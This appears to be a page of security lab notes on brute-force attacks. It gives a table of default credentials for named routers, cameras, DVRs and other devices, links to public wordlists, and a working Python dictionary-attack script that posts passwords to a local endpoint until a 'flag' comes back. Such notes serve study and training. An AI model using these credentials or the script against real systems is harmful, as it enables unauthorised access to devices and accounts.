---
layout: default
title: Brute Force Attacks
permalink: /Web/brute_force/
---

## Default Passwords
Some examples of default passwords:
{% raw %}
| Device/Manufacturer    | Default Username | Default Password | Device Type                     |
|------------------------|------------------|------------------|---------------------------------|
| Linksys Router         | admin            | admin            | Wireless Router                 |
| D-Link Router          | admin            | admin            | Wireless Router                 |
| Netgear Router         | admin            | password         | Wireless Router                 |
| TP-Link Router         | admin            | admin            | Wireless Router                 |
| Cisco Router           | cisco            | cisco            | Network Router                  |
| Asus Router            | admin            | admin            | Wireless Router                 |
| Belkin Router          | admin            | password         | Wireless Router                 |
| Zyxel Router           | admin            | 1234             | Wireless Router                 |
| Samsung SmartCam       | admin            | 4321             | IP Camera                       |
| Hikvision DVR          | admin            | 12345            | Digital Video Recorder (DVR)   |
| Axis IP Camera         | root             | pass             | IP Camera                       |
| Ubiquiti UniFi AP      | ubnt             | ubnt             | Wireless Access Point           |
| Canon Printer          | admin            | admin            | Network Printer                 |
| Honeywell Thermostat   | admin            | 1234             | Smart Thermostat                |
| Panasonic DVR          | admin            | 12345            | Digital Video Recorder (DVR)   |
{% endraw %}
SecLists maintains a list of common usernames at [top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt).

## Utilizing Wordlists

- Publicly Available Lists: Repositories like [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) offer various wordlists catering to various attack scenarios.
- Custom-Built Lists: We can craft our wordlists by leveraging information gleaned during reconnaissance.

Example python script for dictionary attack:
```
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```


